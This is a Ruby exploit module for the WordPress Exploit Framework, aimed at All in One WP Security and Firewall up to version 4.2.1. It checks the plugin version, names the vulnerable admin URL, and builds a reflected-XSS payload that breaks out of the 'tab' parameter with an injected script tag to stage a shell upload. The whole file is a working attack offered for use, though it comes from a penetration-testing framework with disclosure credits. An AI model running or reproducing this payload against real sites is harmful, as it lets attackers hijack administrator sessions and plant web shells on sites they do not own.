class Wpxf::Exploit::AllInOneWpSecurityAndFireWallReflectedXssShellUpload < Wpxf::Module
  include Wpxf::WordPress::StagedReflectedXss

  def initialize
    super

    update_info(
      name: 'All in One WP Security and Firewall <= 4.2.1 Reflected XSS Shell Upload',
      author: [
        'Hendrik Buchwald',                  # Discovery and disclosure
        'phyushin <phyushin[at]phyubox.com>' # WPXF module
      ],
      references: [
        ['WPVDB', '8696'],
        ['URL', 'https://blog.ripstech.com/2016/the-state-of-wordpress-security/']
      ],
      date: 'Dec 14 2016'
    )
  end

  def check
    check_plugin_version_from_readme('all-in-one-wp-security-and-firewall', '4.2.2')
  end

  def vulnerable_url
    normalize_uri(wordpress_url_admin, 'admin.php?page=aiowpsec&tab=tab3')
  end

  def initial_script
    create_basic_post_script(
      vulnerable_url,
      'post_type' => 'post',
      'tab'       =>  "\\\"><script>#{xss_ascii_encoded_include_script}<\\/script>"
    )
  end
end
